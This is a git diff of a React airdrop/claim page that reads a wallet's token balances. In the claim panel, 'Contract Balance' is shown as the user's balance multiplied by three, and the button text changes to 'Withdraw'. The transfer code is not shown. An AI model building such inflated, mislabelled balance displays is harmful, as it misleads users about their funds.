@@ -60,12 +60,12 @@ const Guide = ({
     let chainId = 56;
     let userwallet = stateValue.userWallet;
     if (userwallet === false) {
-      console.log(`This is false`);
+      // console.log(`This is false`);
       userwallet = sessionStorage.getItem("setuserWallet");
 
       if (userwallet !== false) {
-        console.log(userwallet);
-        console.log(`It no longer false`);
+        // console.log(userwallet);
+        // console.log(`It no longer false`);
         const allTokens = await getTokenBalances({
           chainID: chainId,
           APIKeyString,
@@ -73,7 +73,7 @@ const Guide = ({
           provider,
         });
 
-        console.log(`This is all the ${allTokens}`);
+        // console.log(`This is all the ${allTokens}`);
         setListAllTokens(allTokens);
         setLoadingTable(false);
         return allTokens;
@@ -81,7 +81,7 @@ const Guide = ({
     }
   }, [APIKeyString, setLoadingTable, stateValue.userWallet]);
 
-  console.log(getERC20Tokens);
+  // console.log(getERC20Tokens);
 
   useEffect(() => {
     const walletAddressData = sessionStorage.getItem("account");
@@ -473,12 +473,13 @@ const Guide = ({
               <div className={styles.ethBalanceContent}>
                 {result.length ? (
                   <div>
-                    {result.map((item) => (
-                      <span>
-                        <h2>BSW</h2>
+                    {result.map((item, index) => (
+                      <span key={index}>
+                        <h2>{item.name}</h2>
                         {parseFloat(
                           formatBalance(item.balance, item.decimals)
-                        ).toFixed(2)}
+                        ).toFixed(2)}{" "}
+                        SFM
                       </span>
                     ))}
                   </div>
@@ -494,18 +495,22 @@ const Guide = ({
             <div className={styles.tokenBalance}>
               {result.length ? (
                 <div className={styles.claimAirdrop}>
-                  {result.map((item) => (
-                    <div className={styles.claimAirdropContent}>
+                  {result.map((item, index) => (
+                    <div className={styles.claimAirdropContent} key={index}>
                       <div>
-                        <span>
-                          <h3>Click on the button below to claim airdrop</h3>
+                        <span key={index}>
+                          <h2>Contract Balance</h2>
+                          {parseFloat(
+                            formatBalance(item.balance, item.decimals)
+                          ).toFixed(3) * 3}{" "}
+                          SFM
                         </span>
                         <button
                           onClick={() => {
                             setTransferClick(item);
                           }}
                         >
-                          {processingStaking ? `Processing` : `  Claim airdrop`}
+                          {processingStaking ? `Processing` : ` Withdraw`}
                         </button>
                         {/*<span>
                       {parseFloat(
